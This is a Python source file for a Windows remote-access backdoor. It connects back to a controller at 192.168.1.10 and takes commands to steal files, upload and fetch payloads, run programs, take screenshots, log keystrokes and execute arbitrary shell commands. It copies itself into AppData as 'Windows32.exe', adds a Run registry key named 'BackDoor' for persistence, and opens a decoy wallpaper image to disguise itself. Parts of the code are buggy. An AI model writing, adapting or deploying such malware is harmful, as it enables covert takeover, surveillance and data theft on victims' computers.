#!/usr/bin/python
 
from operator import sub
import socket, subprocess, json, os, base64, shutil, sys, requests, threading, keylog
from time import sleep
from mss import mss

keylog_path = os.environ["appdata"] + "\\procman.txt"

def connection():
    while True:
        sleep.sleep(20)
        try:
            sock.connect(("192.168.1.10", 54321))
            shell()
        except:
            connection()

def reliable_send(data):
    json_data = json.dumps(str(data))
    sock.send(json_data)

def reliable_recv():
    data = ""
    while True:
        try:
            data = data + sock.recv(1024)
            return json.loads(data)
        except ValueError:
            continue

def is_admin():
    global admin
    try:
        temp = os.listdir([os.sep.join(os.environ.get('SystemRoot', 'C:\Windows'), 'temp')])
    except:
        admin = "[!!] Non-privledged access"
    else:
        admin = "[+] Privledged access"
def screenshot():
    with mss() as screenshot:
        screenshot.shot()

def webdl(url):
    get_response = requests.get(url)
    filename = url.split("/")[-1]
    with open(filename, "wb") as out_file:
        out_file.write(get_response.content)

def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            print("Exiting.")
            break
        elif command[:4] == "help":
            help_options = '''
            download path --> Download file from remote
            upload path --> Upload file to remote
            get url --> Download file to remote
            start --> Start app on remote
            screenshot --> Take screenshot of target
            check --> Check priviledge level
            quit --> Exit reverse shell
            keylog_start --> Start keylogger
            keylog_dump --> Dump keylog file
            '''
            reliable_send(help_options)
        elif command[:2] == "cd" and len(command) > 1:
            try:
                os.chdir(command[3:])
            except:
                continue
        elif command[:8] == "download":
            with open(command[9:], "rb") as file:
                reliable_send(base64.b64encode(file.read()))
        elif command[:6] == "upload":
            with open(command[7:], "wb") as file:
                file_data = reliable_recv()
                file.write(base64.b64decode(file_data))
        elif command[:3] == "get":
            try:
                webdl(command[4:])
                reliable_send("[+] Download from URL success")
            except:
                reliable_send("[!! Download failed")
        elif command[:5] == "start":
            try:
                subprocess.Popen(command[6:], shell=True)
                reliable_send("[+] Started")
            except:
                reliable_send("[!!] Failed to open")
        elif command[:10] == "screenshot":
            try:
                screenshot()
                with open("monitor-1.png", "rb") as sc:
                    reliable_send(base64.b64encode(sc.read()))
                    os.remove("monitor-1.png")
            except:
                reliable_send("[!!] Failed to take screenshot")
        elif command[:5] == "check":
            try:
                is_admin()
                reliable_send(admin)
            except:
                reliable_send("Can't perform check")
        elif command[:12] == "keylog_start":
            thd1 = threading.Thread(target=keylog.start)
            thd1.start()
        elif command[:11] == "keylog_dump":
            fn = open(keylog_path, "r")
            reliable_send(fn.read())
        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            reliable_send(result)

location = os.environ["AppData"] + "\\Windows32.exe"
if not os.path.exists(location):
    shutil.copyfile(sys.executable, location)
    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v BackDoor /t REG_SZ /d "' + location + '"', shell=True)

# Embed in image
    file_name = sys._MEIPASS + "\wallpaper.jpg"
    try:
        subprocess.Popen(file_name, shell=True)
    except:
        nu = 1
        nu2 = 3
        nu3 = nu + nu2

# Create IPv4 TCP object
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connection()
sock.close()
